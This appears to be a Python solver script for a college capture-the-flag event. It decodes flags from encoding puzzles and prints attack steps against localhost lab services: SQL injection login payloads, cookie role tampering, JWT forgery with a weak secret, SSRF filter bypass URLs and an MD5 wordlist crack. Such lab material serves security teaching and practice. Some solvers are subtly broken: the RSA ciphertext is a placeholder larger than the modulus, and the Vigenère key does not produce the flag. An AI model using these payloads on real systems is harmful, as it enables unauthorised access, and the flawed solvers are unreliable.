#!/usr/bin/env python3

import base64
import codecs
import hashlib
import requests
import json

def solve_welcome():
    
    print("Solution: The flag is literally in the challenge description!")
    print("Just read it carefully ;)")
    print("flag{welcome_to_college_ctf_2026}")

def solve_base64():
    
    encoded = "ZmxhZ3tiYXNlNjRfaXNfdGhlX2ZpcnN0X3RoaW5nX3lvdV9sZWFybn0="
    decoded = base64.b64decode(encoded).decode()
    print(f"Decoded: {decoded}")

def solve_hex():
    
    hex_str = "66 6c 61 67 7b 68 65 78 5f 69 73 5f 63 6f 6f 6c 5f 72 69 67 68 74 7d"
    decoded = bytes.fromhex(hex_str).decode()
    print(f"Decoded: {decoded}")

def solve_caesar():
    
    cipher = "synt{pnpghzr_frpnyr_gjb_gjb_a}"
    decoded = codecs.decode(cipher, 'rot_13')
    print(f"Decoded: {decoded}")

def solve_rot13():
    
    cipher = "synt{ebg13_vf_n_puvyqref_pvcure}"
    decoded = codecs.decode(cipher, 'rot_13')
    print(f"Decoded: {decoded}")

def solve_cookie(port=5002):
    
    print(f"Accessing http://localhost:{port}")
    print("Change the 'role' cookie from 'guest' to 'admin'")
    print("In browser: F12 → Application → Cookies → role = admin")
    print("\nOr use curl:")
    print(f'curl -b "role=admin" http://localhost:{port}')

def solve_sql(port=5003):
    
    print(f"SQL Injection attack on http://localhost:{port}")
    print("\nMethod 1: Username: admin' --  Password: anything")
    print("Method 2: Username: ' OR '1'='1  Password: anything")
    print("\nOr just use the default credentials:")
    print("Username: admin, Password: supersecretpassword123")

def solve_jwt(port=5004):
    
    print("JWT Token Forgery Attack")
    print("1. Get a token by logging in as any user")
    print("2. Decode at https://jwt.io")
    print("3. Change payload to: {\"username\": \"admin\", \"role\": \"admin\"}")
    print("4. Sign with secret: weak_secret_key_123")
    print("5. Submit the modified token")

def solve_rsa():
    
    from sympy import factorint
    
    n = 1000000016000000063
    e = 65537
    c = 32733159860069353218860496061234567890  # Example
    
    print(f"Factoring n = {n}...")
    factors = factorint(n)
    p, q = list(factors.keys())
    print(f"p = {p}")
    print(f"q = {q}")
    
    phi = (p-1) * (q-1)
    d = pow(e, -1, phi)
    
    plaintext = pow(c, d, n)
    flag = plaintext.to_bytes((plaintext.bit_length() + 7) // 8, 'big').decode()
    print(f"Decrypted: {flag}")

def solve_vigenere():
    
    def decrypt(ciphertext, key):
        decrypted = []
        key_length = len(key)
        key_index = 0
        
        for char in ciphertext:
            if char.isalpha():
                key_char = key[key_index % key_length]
                shift = ord(key_char.lower()) - ord('a')
                
                if char.isupper():
                    decrypted_char = chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
                else:
                    decrypted_char = chr((ord(char) - ord('a') - shift) % 26 + ord('a'))
                
                decrypted.append(decrypted_char)
                key_index += 1
            else:
                decrypted.append(char)
        
        return ''.join(decrypted)
    
    encrypted = "qygv{vieeeme_cipher_vlgc_ieorw_xey}"
    key = "college"
    print(f"Key: {key}")
    print(f"Decrypted: {decrypt(encrypted, key)}")

def solve_md5():
    
    target = "d93a5def163fd0788975da8d77626dea"
    
    common_passwords = [
        "password", "123456", "qwerty", "admin", "letmein",
        "welcome", "monkey", "dragon", "master", "college",
        "football", "shadow", "michael", "hello", "charlie"
    ]
    
    print(f"Target hash: {target}")
    for pwd in common_passwords:
        if hashlib.md5(pwd.encode()).hexdigest() == target:
            print(f"Cracked! Password: {pwd}")
            return
    
    print("Password not in common list")

def solve_ssrf(port=5008):
    
    print("SSRF Bypass Techniques:")
    print("\n1. Decimal IP:")
    print(f"   http://2130706433:9999")
    print("\n2. Hex IP:")
    print(f"   http://0x7f000001:9999")
    print("\n3. Octal IP:")
    print(f"   http://0177.0.0.1:9999")
    print("\n4. IPv6:")
    print(f"   http://[::1]:9999")
    print("\nTry these URLs in the challenge!")

SOLVERS = {
    'welcome': solve_welcome,
    'base64': solve_base64,
    'hex': solve_hex,
    'caesar': solve_caesar,
    'rot13': solve_rot13,
    'cookie': solve_cookie,
    'sql': solve_sql,
    'jwt': solve_jwt,
    'rsa': solve_rsa,
    'vigenere': solve_vigenere,
    'md5': solve_md5,
    'ssrf': solve_ssrf,
}

def main():
    import sys
    
    if len(sys.argv) < 2:
        print("CTF Challenge Solver")
        print("=" * 40)
        print("\nAvailable solvers:")
        for name in SOLVERS:
            print(f"  - {name}")
        print(f"\nUsage: python3 {sys.argv[0]} <challenge_name>")
        return
    
    challenge = sys.argv[1].lower()
    
    if challenge in SOLVERS:
        print(f"\n{'='*40}")
        print(f"  Solving: {challenge.upper()}")
        print(f"{'='*40}\n")
        SOLVERS[challenge]()
    else:
        print(f"Unknown challenge: {challenge}")
        print(f"Available: {', '.join(SOLVERS.keys())}")

if __name__ == '__main__':
    main()
